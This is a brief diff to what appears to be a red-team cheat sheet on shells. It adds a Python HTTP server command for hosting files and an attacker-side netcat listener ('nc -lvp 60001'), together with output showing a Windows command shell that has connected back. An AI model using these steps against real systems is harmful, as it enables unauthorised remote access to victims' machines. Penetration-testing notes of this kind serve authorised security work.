@@ -7,8 +7,16 @@ Shells
 
 
 
+#Host a file directory on Linux
+python2.7 -m SimpleHTTPServer 80
+
+
+
 #Open a shell on the Attacker(RedTeam)
-nc -plv 1234
+nc -lvp 60001
+Connection from x.x.x.x:49191
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
 
 
 
